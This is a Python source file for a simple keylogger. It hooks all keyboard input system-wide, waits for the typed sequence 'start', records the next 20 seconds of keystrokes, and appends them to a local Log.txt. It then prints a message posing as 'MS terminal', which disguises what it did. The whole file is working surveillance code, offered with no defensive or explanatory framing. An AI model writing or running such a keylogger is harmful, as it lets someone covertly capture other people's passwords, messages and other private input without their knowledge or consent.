import keyboard
import time

seq = ["s","t","a","r","t"]
current_info = []
is_record = False
countdown_name = 0 
important_text = []


def check_seq(event):
    global current_info, is_record, countdown_name, important_text, final_text
    if event.event_type == "down":

        #PHASE A: Recording     
        if is_record:
            if time.time() - countdown_name > 20:
                #Stops listening + Fixes spacing between characters
                keyboard.unhook(check_seq)  
                final_text = "".join(important_text)
                with open("Log.txt","a") as f:
                    print(final_text, file=f)
                    print("\n[Thank You for Using MS terminal]")
                return 

            #Fixes spaces and non alpha-numeric characters
            if event.name == "space":
                important_text.append(" ")
            elif len(event.name) == 1:
                important_text.append(event.name)
            return

        #PHASE B: Wait + Check for seq
        current_info.append(event.name)

        #Rolling Buffer of garbage characters
        if len(current_info)>len(seq):
            current_info.pop(0)

        #Checks to see if stard cmd init, If T, then starts timer and logger
        if current_info == seq:
            current_info.clear()
            important_text.clear()
            countdown_name = time.time()
            is_record = True 

keyboard.hook(check_seq)
keyboard.wait()